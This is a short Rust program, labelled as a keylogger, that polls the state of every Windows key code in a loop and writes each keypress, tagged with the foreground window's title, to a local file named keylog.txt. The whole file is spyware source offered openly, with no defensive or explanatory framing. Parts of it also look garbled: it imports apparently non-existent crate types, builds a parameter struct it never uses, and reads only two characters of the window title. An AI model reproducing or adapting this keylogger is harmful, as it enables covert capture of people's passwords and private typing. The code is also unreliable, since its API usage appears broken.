// Keylogger in Rust
use std::fs::OpenOptions;
use std::io::Write;
use std::time::Duration;
use winapi::{
    ctypes::c_int,
    shared::{
        minwindef::{DWORD, LPARAM, WPARAM},
        ntdef::LPCWSTR,
        windef::HWND,
    },
    um::{winuser::GetForegroundWindow, winuser::GetWindowTextW},
};
use user32_sys::winuser::{
    GetAsyncKeyState, MapVirtualKeyW, MapVirtualKeyWParams, SendInput, SendInputParams,
    VirtualKeyCode,
};

const LOG_FILE_NAME: &str = "keylog.txt";

fn log_keys() {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(LOG_FILE_NAME)
        .unwrap();
    loop {
        std::thread::sleep(Duration::from_millis(10));
        for i in 0..255 {
            let state = unsafe { GetAsyncKeyState(i as c_int) };
            if (state & 1) == 1 {
                let mut buf = [0u16; 2];
                let mut params = MapVirtualKeyWParams {
                    uCode: i,
                    uMapType: 0,
                };
                unsafe {
                    MapVirtualKeyW(i, 0);
                    let _ = GetWindowTextW(GetForegroundWindow(), buf.as_mut_ptr(), 2);
                    let text = String::from_utf16_lossy(&buf);
                    let _ = write!(file, "[{}]: {}\n", text.trim(), i);
                }
            }
        }
    }
}

fn main() {
    log_keys();
}
